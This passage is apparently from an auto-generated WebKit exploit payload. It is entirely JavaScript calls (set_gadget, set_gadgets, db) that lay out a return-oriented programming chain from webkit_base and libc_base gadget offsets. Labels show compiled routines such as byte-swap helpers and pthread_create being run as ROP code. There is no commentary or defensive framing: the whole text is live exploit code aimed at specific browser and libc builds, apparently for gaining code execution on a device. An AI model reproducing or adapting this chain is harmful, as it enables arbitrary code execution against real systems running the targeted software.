webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+143344,//L1963
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+143312,//L1961
webkit_base+4687784,
libc_base+165442
]);
//L1961:
db([0,0]);
set_gadget(libc_base+772328,);
//L1962:
db([0,0]);
set_gadget(libc_base+768796,);
//L1963:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+143448,//L1964
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+143464,//L1965
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L1964:
db([0,0]);
set_gadget(libc_base+768796,);
//L1965:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+143584,//L1966
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+143568,//L1967
webkit_base+4687784,
libc_base+768796
]);
//L1967:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L1966:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+143672,//L1969
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+143656,//L1968
webkit_base+4687784,
libc_base+165442
]);
//L1968:
db([0,0]);
set_gadget(libc_base+768796,);
//L1969:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+143776,//L1970
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+143792,//L1971
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L1970:
db([0,0]);
set_gadget(libc_base+768796,);
//L1971:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+143912,//L1972
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+143896,//L1973
webkit_base+4687784,
libc_base+768796
]);
//L1973:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L1972:
db([0,0]);
//___bswap32_var:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+143984,//L1975
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L1975:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+144096,//L1978
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+144112,//L1979
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
//L1976:
db([16,0]);// 0x10
set_gadget(webkit_base+1420514,);//pop r8
//L1978:
db([0,0]);
set_gadget(libc_base+772328,);
//L1979:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+144200,//L1981
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+144216,//L1982
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L1981:
db([0,0]);
set_gadget(libc_base+772328,);
//L1982:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+144376,//L1984
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+144408,//L1986
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+144360,//L1983
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+144392,//L1985
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1983:
db([0,0]);
set_gadget(libc_base+165442,);
//L1984:
db([0,0]);
set_gadget(libc_base+772328,);
//L1985:
db([0,0]);
set_gadget(libc_base+768796,);
//L1986:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+144568,//L1990
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+144520,//L1987
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+144536,//L1988
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L1987:
db([0,0]);
set_gadget(libc_base+165442,);
//L1988:
db([0,0]);
set_gadget(libc_base+772328,);
//L1989:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L1990:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+144704,//L1992
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+144720,//L1993
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+144688,//L1991
webkit_base+4687784,
libc_base+165442
]);
//L1991:
db([0,0]);
set_gadget(libc_base+772328,);
//L1992:
db([0,0]);
set_gadget(libc_base+768796,);
//L1993:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+144824,//L1994
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+144840,//L1995
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L1994:
db([0,0]);
set_gadget(libc_base+768796,);
//L1995:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+144960,//L1996
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+144944,//L1997
webkit_base+4687784,
libc_base+768796
]);
//L1997:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L1996:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+145048,//L1999
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+145032,//L1998
webkit_base+4687784,
libc_base+165442
]);
//L1998:
db([0,0]);
set_gadget(libc_base+768796,);
//L1999:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+145152,//L2000
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+145168,//L2001
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2000:
db([0,0]);
set_gadget(libc_base+768796,);
//L2001:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+145288,//L2002
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+145272,//L2003
webkit_base+4687784,
libc_base+768796
]);
//L2003:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2002:
db([0,0]);
//___bswap16_var:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+145360,//L2005
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2005:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+145472,//L2008
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+145488,//L2009
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
//L2006:
db([16,0]);// 0x10
set_gadget(webkit_base+1420514,);//pop r8
//L2008:
db([0,0]);
set_gadget(libc_base+772328,);
//L2009:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+145576,//L2011
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+145592,//L2012
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2011:
db([0,0]);
set_gadget(libc_base+772328,);
//L2012:
db([0,0]);
set_gadgets([
libc_base+229840,//mov ax,[rdi]
libc_base+713278,
ropchain+145752,//L2016
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+145704,//L2013
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+145720,//L2014
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2013:
db([0,0]);
set_gadget(libc_base+165442,);
//L2014:
db([0,0]);
set_gadget(libc_base+772328,);
//L2015:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L2016:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+145808,//L2018
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L2018:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+145920,//L2019
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+145952,//L2021
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+145936,//L2020
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2019:
db([0,0]);
set_gadget(libc_base+772328,);
//L2020:
db([0,0]);
set_gadget(libc_base+768796,);
//L2021:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+146112,//L2025
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+146064,//L2022
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+146080,//L2023
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2022:
db([0,0]);
set_gadget(libc_base+165442,);
//L2023:
db([0,0]);
set_gadget(libc_base+772328,);
//L2024:
db([48,0]);
set_gadget(libc_base+768796,);
//L2025:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+146216,//L2027
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+146200,//L2026
webkit_base+4687784,
libc_base+772328
]);
//L2026:
db([0,0]);
set_gadget(libc_base+768796,);
//L2027:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2028:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L2029:
db([8,0]);// 0x8
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+857161,
libc_base+713278,
ropchain+146424,//L2032
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+146392,//L2030
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2030:
db([0,0]);
set_gadget(libc_base+772328,);
//L2031:
db([48,0]);
set_gadget(libc_base+768796,);
//L2032:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+146528,//L2034
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+146512,//L2033
webkit_base+4687784,
libc_base+772328
]);
//L2033:
db([0,0]);
set_gadget(libc_base+768796,);
//L2034:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+146624,//L2037
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2035:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2037:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+146712,//L2039
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+146728,//L2040
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2039:
db([0,0]);
set_gadget(libc_base+772328,);
//L2040:
db([0,0]);
set_gadgets([
libc_base+229840,//mov ax,[rdi]
libc_base+713278,
ropchain+146888,//L2044
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+146840,//L2041
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+146856,//L2042
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2041:
db([0,0]);
set_gadget(libc_base+165442,);
//L2042:
db([0,0]);
set_gadget(libc_base+772328,);
//L2043:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L2044:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+146944,//L2046
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L2046:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+147056,//L2047
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+147088,//L2049
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+147072,//L2048
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2047:
db([0,0]);
set_gadget(libc_base+772328,);
//L2048:
db([0,0]);
set_gadget(libc_base+768796,);
//L2049:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+147248,//L2053
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+147200,//L2050
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+147216,//L2051
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2050:
db([0,0]);
set_gadget(libc_base+165442,);
//L2051:
db([0,0]);
set_gadget(libc_base+772328,);
//L2052:
db([48,0]);
set_gadget(libc_base+768796,);
//L2053:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+147352,//L2055
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+147336,//L2054
webkit_base+4687784,
libc_base+772328
]);
//L2054:
db([0,0]);
set_gadget(libc_base+768796,);
//L2055:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2056:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L2057:
db([8,0]);// 0x8
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+147552,//L2060
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+147520,//L2058
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2058:
db([0,0]);
set_gadget(libc_base+772328,);
//L2059:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L2060:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+147656,//L2062
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+147640,//L2061
webkit_base+4687784,
libc_base+772328
]);
//L2061:
db([0,0]);
set_gadget(libc_base+768796,);
//L2062:
db([0,0]);
set_gadgets([
libc_base+857183,
libc_base+713278,
ropchain+147768,//L2065
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+147736,//L2063
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2063:
db([0,0]);
set_gadget(libc_base+772328,);
//L2064:
db([48,0]);
set_gadget(libc_base+768796,);
//L2065:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+147832,//L2067
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+772328
]);
//L2067:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+147888,//L2069
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2069:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+72932,//or rax,rcx
libc_base+713278,
ropchain+148040,//L2071
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+148056,//L2072
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+148024,//L2070
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2070:
db([0,0]);
set_gadget(libc_base+165442,);
//L2071:
db([0,0]);
set_gadget(libc_base+768796,);
//L2072:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+148216,//L2076
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+148168,//L2073
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+148184,//L2074
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2073:
db([0,0]);
set_gadget(libc_base+165442,);
//L2074:
db([0,0]);
set_gadget(libc_base+772328,);
//L2075:
db([48,0]);
set_gadget(libc_base+768796,);
//L2076:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+148352,//L2078
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+148368,//L2079
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+148336,//L2077
webkit_base+4687784,
libc_base+165442
]);
//L2077:
db([0,0]);
set_gadget(libc_base+772328,);
//L2078:
db([0,0]);
set_gadget(libc_base+768796,);
//L2079:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+148472,//L2080
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+148488,//L2081
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2080:
db([0,0]);
set_gadget(libc_base+768796,);
//L2081:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+148608,//L2082
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+148592,//L2083
webkit_base+4687784,
libc_base+768796
]);
//L2083:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2082:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+148696,//L2085
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+148680,//L2084
webkit_base+4687784,
libc_base+165442
]);
//L2084:
db([0,0]);
set_gadget(libc_base+768796,);
//L2085:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+148800,//L2086
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+148816,//L2087
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2086:
db([0,0]);
set_gadget(libc_base+768796,);
//L2087:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+148936,//L2088
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+148920,//L2089
webkit_base+4687784,
libc_base+768796
]);
//L2089:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2088:
db([0,0]);
//_pthread_create__rop:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+149008,//L2091
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2091:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+149072,//L2093
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2093:
db([0,0]);
set_gadget(libc_base+713278,);
db([24,0]);// 0x18
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+149192,//L2095
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+149224,//L2097
webkit_base+4687784,
libc_base+768796
]);
//L2094:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L2095:
db([0,0]);
set_gadget(libc_base+165442,);
//L2096:
db([0,0]);
set_gadget(libc_base+772328,);
//L2097:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+149320,//L2099
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+149304,//L2098
webkit_base+4687784,
libc_base+165442
]);
//L2098:
db([0,0]);
set_gadget(libc_base+768796,);
//L2099:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2100:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2101:
db([1,0]);// 0x1
set_gadget(libc_base+772328,);
//L2102:
db([1,0]);// 0x1
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2103:
db([1,0]);// 0x1
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2105:
db([4096,0]);// 0x1000
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+149632,//L2107
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2107:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+72932,//or rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2108:
db([1,0]);// 0x1
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2110:
db([2,0]);// 0x2
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+149824,//L2112
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2112:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+72932,//or rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+149952,//L2114
webkit_base+4687784,
libc_base+768796
]);
//L2113:
db([65536,0]);// 0x10000
set_gadget(webkit_base+3789839,);//pop r11
//L2114:
db([0,0]);
set_gadget(libc_base+165442,);
//L2115:
db([65536,0]);// 0x10000
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+150064,//L2117
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+150048,//L2116
webkit_base+4687784,
libc_base+165442
]);
//L2116:
db([0,0]);
set_gadget(libc_base+768796,);
//L2117:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2118:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2120:
ropchain+150216,//L2119
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+160336,//L2121
//L2119:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967248,4294967295]);// -0x30
set_gadgets([
libc_base+207036,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+150312,//L2123
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2123:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+713278,
ropchain+150368,//L2125
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2125:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2126:
db([65536,0]);// 0x10000
set_gadget(libc_base+772328,);
//L2127:
db([65536,0]);// 0x10000
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+764700,//add rax,rcx
libc_base+713278,
ropchain+150520,//L2129
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2129:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+150576,//L2131
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2131:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+150664,//L2134
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2132:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L2134:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2135:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L2137:
db([312,0]);// 0x138
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2138:
db([4294967284,4294967295]);// -0xc
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+150848,//L2141
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+150864,//L2142
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2141:
db([0,0]);
set_gadget(libc_base+772328,);
//L2142:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+151024,//L2144
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+151056,//L2146
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+151008,//L2143
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+151040,//L2145
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2143:
db([0,0]);
set_gadget(libc_base+165442,);
//L2144:
db([0,0]);
set_gadget(libc_base+772328,);
//L2145:
db([0,0]);
set_gadget(libc_base+768796,);
//L2146:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+151152,//L2148
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+151136,//L2147
webkit_base+4687784,
libc_base+165442
]);
//L2147:
db([0,0]);
set_gadget(libc_base+768796,);
//L2148:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2149:
db([1,0]);// 0x1
set_gadget(libc_base+772328,);
//L2150:
db([1,0]);// 0x1
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+844101,//sub rax,rcx ;sbb rdx,rcx
libc_base+713278,
ropchain+151376,//L2152
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+151392,//L2153
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+151360,//L2151
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2151:
db([0,0]);
set_gadget(libc_base+165442,);
//L2152:
db([0,0]);
set_gadget(libc_base+768796,);
//L2153:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+151512,//L2157
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+151496,//L2156
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2154:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+165442,);
//L2156:
db([0,0]);
set_gadget(libc_base+772328,);
//L2157:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2158:
db([4294967284,4294967295]);// -0xc
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+151640,//L2161
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+151656,//L2162
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2161:
db([0,0]);
